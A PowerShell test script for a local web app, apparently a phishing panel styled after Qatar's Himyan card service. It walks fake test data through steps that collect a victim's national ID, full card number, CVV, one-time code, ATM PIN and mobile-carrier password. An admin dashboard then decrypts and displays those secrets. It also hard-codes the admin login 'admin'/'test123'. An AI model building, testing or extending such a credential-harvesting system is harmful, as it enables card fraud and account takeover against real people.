# Full Flow Testing Script for Himyan System
# ==========================================

Write-Host "`n======================================" -ForegroundColor Cyan
Write-Host "Testing Himyan Complete Flow" -ForegroundColor Cyan
Write-Host "======================================`n" -ForegroundColor Cyan

$baseUrl = "http://localhost:3000"

function Show-Test {
    param($name, $success, $details = "")
    if ($success) {
        Write-Host "[OK] $name" -ForegroundColor Green
        if ($details) { Write-Host "     $details" -ForegroundColor Gray }
    } else {
        Write-Host "[FAIL] $name" -ForegroundColor Red
        if ($details) { Write-Host "     $details" -ForegroundColor Yellow }
    }
}

# Test 1: Server Health Check
Write-Host "`n[TEST 1] Server Health Check" -ForegroundColor Yellow
try {
    $health = Invoke-WebRequest -Uri "$baseUrl/index.html" -UseBasicParsing -TimeoutSec 5
    Show-Test "Server is running" $true "Status: $($health.StatusCode)"
} catch {
    Show-Test "Server is running" $false "Cannot connect to server"
    exit 1
}

# Test 2: Create New Request
Write-Host "`n[TEST 2] Create Application Request" -ForegroundColor Yellow
$requestBody = @{
    cardType = "debit"
    fullName = "Ahmed Mohamed Al-Ali"
    nationalId = "12345678901"
    mobile = "55551234"
    email = "ahmed.test@email.com"
    nationality = "citizen"
    bank = "qnb"
} | ConvertTo-Json

try {
    $create = Invoke-RestMethod -Method POST -Uri "$baseUrl/api/requests" -Body $requestBody -ContentType "application/json"
    $requestId = $create.id
    Show-Test "Create request" $true "Request ID: $requestId"
    Write-Host "     Name: Ahmed Mohamed Al-Ali" -ForegroundColor Gray
    Write-Host "     National ID: 12345678901" -ForegroundColor Gray
    Write-Host "     Mobile: +974 55551234" -ForegroundColor Gray
} catch {
    Show-Test "Create request" $false $_.Exception.Message
    exit 1
}

# Test 3: Submit Card Data
Write-Host "`n[TEST 3] Submit Card Information" -ForegroundColor Yellow
$cardBody = @{
    id = $requestId
    cardHolderName = "Ahmed Mohamed Al-Ali"
    cardNumber = "4000123456789010"
    cardExpiryMonth = "08"
    cardExpiryYear = "2029"
    cardCvv = "123"
} | ConvertTo-Json

try {
    $confirm = Invoke-RestMethod -Method POST -Uri "$baseUrl/api/requests/confirm" -Body $cardBody -ContentType "application/json"
    Show-Test "Submit card data" $true "Card data encrypted and saved"
    Write-Host "     Cardholder: Ahmed Mohamed Al-Ali" -ForegroundColor Gray
    Write-Host "     Card Number: 4000123456789010" -ForegroundColor Gray
    Write-Host "     Expiry: 08/2029" -ForegroundColor Gray
    Write-Host "     CVV: 123" -ForegroundColor Gray
} catch {
    Show-Test "Submit card data" $false $_.Exception.Message
}

# Test 4: Admin Login
Write-Host "`n[TEST 4] Admin Login" -ForegroundColor Yellow
$loginBody = @{
    username = "admin"
    password = "test123"
} | ConvertTo-Json

try {
    $login = Invoke-WebRequest -Method POST -Uri "$baseUrl/api/admin/login" -Body $loginBody -ContentType "application/json" -SessionVariable session
    Show-Test "Admin login" $true "Session created"
    
    # Extract admin token
    $adminToken = ""
    if ($login.Headers.'Set-Cookie') {
        $cookie = $login.Headers.'Set-Cookie'
        if ($cookie -match 'himyan_admin=([^;]+)') {
            $adminToken = $matches[1]
            Write-Host "     Token: $($adminToken.Substring(0,20))..." -ForegroundColor Gray
        }
    }
} catch {
    Show-Test "Admin login" $false $_.Exception.Message
    exit 1
}

# Test 5: Approve Request
Write-Host "`n[TEST 5] Approve Request by Admin" -ForegroundColor Yellow
$approveBody = @{
    id = $requestId
    status = "approved"
} | ConvertTo-Json

$headers = @{
    Cookie = "himyan_admin=$adminToken"
}

try {
    $approve = Invoke-RestMethod -Method PATCH -Uri "$baseUrl/api/admin/requests" -Body $approveBody -ContentType "application/json" -Headers $headers
    Show-Test "Approve request" $true "Status changed to: approved"
} catch {
    Show-Test "Approve request" $false $_.Exception.Message
}

# Test 6: Submit OTP Code
Write-Host "`n[TEST 6] Submit OTP Verification Code" -ForegroundColor Yellow
$otpBody = @{
    id = $requestId
    code = "654321"
} | ConvertTo-Json

try {
    $otp = Invoke-RestMethod -Method POST -Uri "$baseUrl/api/requests/code" -Body $otpBody -ContentType "application/json"
    Show-Test "Submit OTP" $true "OTP Code: 654321"
    Write-Host "     Code: 6 5 4 3 2 1" -ForegroundColor Green
} catch {
    Show-Test "Submit OTP" $false $_.Exception.Message
}

# Test 7: Submit ATM PIN
Write-Host "`n[TEST 7] Submit ATM PIN" -ForegroundColor Yellow
$atmBody = @{
    id = $requestId
    atmPin = "1234"
} | ConvertTo-Json

try {
    $atm = Invoke-RestMethod -Method POST -Uri "$baseUrl/api/requests/atm-pin" -Body $atmBody -ContentType "application/json"
    Show-Test "Submit ATM PIN" $true "PIN: 1234"
} catch {
    Show-Test "Submit ATM PIN" $false $_.Exception.Message
}

# Test 8: Select Network Provider
Write-Host "`n[TEST 8] Select Network Provider" -ForegroundColor Yellow
$providerBody = @{
    id = $requestId
    provider = "vodafone"
} | ConvertTo-Json

try {
    $provider = Invoke-RestMethod -Method POST -Uri "$baseUrl/api/requests/network-provider" -Body $providerBody -ContentType "application/json"
    Show-Test "Select provider" $true "Provider: Vodafone Qatar"
} catch {
    Show-Test "Select provider" $false $_.Exception.Message
}

# Test 9: Submit Provider Login
Write-Host "`n[TEST 9] Submit Provider Credentials" -ForegroundColor Yellow
$providerLoginBody = @{
    id = $requestId
    provider = "vodafone"
    mobile = "66665678"
    password = "MyTestPassword123"
} | ConvertTo-Json

try {
    $providerLogin = Invoke-RestMethod -Method POST -Uri "$baseUrl/api/requests/provider-login" -Body $providerLoginBody -ContentType "application/json"
    Show-Test "Submit provider login" $true "All steps completed"
} catch {
    Show-Test "Submit provider login" $false $_.Exception.Message
}

# Test 10: Get Admin Summary
Write-Host "`n[TEST 10] View in Admin Dashboard" -ForegroundColor Yellow
try {
    $summary = Invoke-RestMethod -Method GET -Uri "$baseUrl/api/admin/summary" -Headers $headers
    Show-Test "Fetch admin data" $true "Total requests: $($summary.totalRequests)"
    
    $ourRequest = $summary.requests | Where-Object { $_.id -eq $requestId }
    
    if ($ourRequest) {
        Write-Host "`n     === Request Details in Admin Panel ===" -ForegroundColor Cyan
        Write-Host "     Name: $($ourRequest.fullName)" -ForegroundColor White
        Write-Host "     Email: $($ourRequest.email)" -ForegroundColor White
        Write-Host "     Bank: $($ourRequest.bank)" -ForegroundColor White
        
        if ($ourRequest.cardHolderName) {
            Write-Host "`n     Card Information:" -ForegroundColor Magenta
            Write-Host "     - Cardholder: $($ourRequest.cardHolderName)" -ForegroundColor White
            Write-Host "     - Expiry: $($ourRequest.cardExpiryMonth)/$($ourRequest.cardExpiryYear)" -ForegroundColor White
            Write-Host "     - Card Number: [ENCRYPTED]" -ForegroundColor Yellow
            Write-Host "     - CVV: [ENCRYPTED]" -ForegroundColor Yellow
        }
        
        $otpCode = if ($ourRequest.confirmationCode) { $ourRequest.confirmationCode } else { $ourRequest.confirmation_code }
        if ($otpCode) {
            Write-Host "`n     OTP Verification Code:" -ForegroundColor Green
            Write-Host "     ╔═══════════════╗" -ForegroundColor Green
            Write-Host "     ║   $otpCode    ║" -ForegroundColor Green
            Write-Host "     ╚═══════════════╝" -ForegroundColor Green
        }
        
        Write-Host "`n     Status: $($ourRequest.status)" -ForegroundColor Cyan
    }
} catch {
    Show-Test "Fetch admin data" $false $_.Exception.Message
}

# Test 11: Decrypt Card Number
Write-Host "`n[TEST 11] Decrypt Card Number" -ForegroundColor Yellow
try {
    $field = "card_number"
    $decryptUrl = ("{0}/api/admin/requests/decrypt?id={1}" + "&" + "field={2}") -f $baseUrl, $requestId, $field
    $cardDecrypt = Invoke-RestMethod -Method GET -Uri $decryptUrl -Headers $headers
    Show-Test "Decrypt card number" $true "Number: $($cardDecrypt.value)"
} catch {
    Show-Test "Decrypt card number" $false $_.Exception.Message
}

# Test 12: Decrypt CVV
Write-Host "`n[TEST 12] Decrypt CVV" -ForegroundColor Yellow
try {
    $field = "card_cvv"
    $decryptUrl = ("{0}/api/admin/requests/decrypt?id={1}" + "&" + "field={2}") -f $baseUrl, $requestId, $field
    $cvvDecrypt = Invoke-RestMethod -Method GET -Uri $decryptUrl -Headers $headers
    Show-Test "Decrypt CVV" $true "CVV: $($cvvDecrypt.value)"
} catch {
    Show-Test "Decrypt CVV" $false $_.Exception.Message
}

# Test 13: Decrypt ATM PIN
Write-Host "`n[TEST 13] Decrypt ATM PIN" -ForegroundColor Yellow
try {
    $field = "atm_pin"
    $decryptUrl = ("{0}/api/admin/requests/decrypt?id={1}" + "&" + "field={2}") -f $baseUrl, $requestId, $field
    $atmDecrypt = Invoke-RestMethod -Method GET -Uri $decryptUrl -Headers $headers
    Show-Test "Decrypt ATM PIN" $true "PIN: $($atmDecrypt.value)"
} catch {
    Show-Test "Decrypt ATM PIN" $false $_.Exception.Message
}

# Test 14: Decrypt Provider Password
Write-Host "`n[TEST 14] Decrypt Provider Password" -ForegroundColor Yellow
try {
    $field = "provider_password"
    $decryptUrl = ("{0}/api/admin/requests/decrypt?id={1}" + "&" + "field={2}") -f $baseUrl, $requestId, $field
    $passDecrypt = Invoke-RestMethod -Method GET -Uri $decryptUrl -Headers $headers
    Show-Test "Decrypt provider password" $true "Password: $($passDecrypt.value)"
} catch {
    Show-Test "Decrypt provider password" $false $_.Exception.Message
}

# Final Summary
Write-Host ""
Write-Host "======================================" -ForegroundColor Cyan
Write-Host "Test Summary" -ForegroundColor Cyan
Write-Host "======================================" -ForegroundColor Cyan

Write-Host "`nAll tests completed!" -ForegroundColor Green
Write-Host "`nImportant Links:" -ForegroundColor Cyan
Write-Host "  Application Page: http://localhost:3000/apply.html" -ForegroundColor White
Write-Host "  Admin Dashboard: http://localhost:3000/admin.html" -ForegroundColor White
Write-Host "  Home Page: http://localhost:3000/" -ForegroundColor White

Write-Host "`nAdmin Credentials:" -ForegroundColor Yellow
Write-Host "  Username: admin" -ForegroundColor Gray
Write-Host "  Password: test123" -ForegroundColor Gray

Write-Host "`nOpen the admin panel in your browser to see the visual results!" -ForegroundColor Magenta
Write-Host "======================================" -ForegroundColor Cyan
Write-Host ""

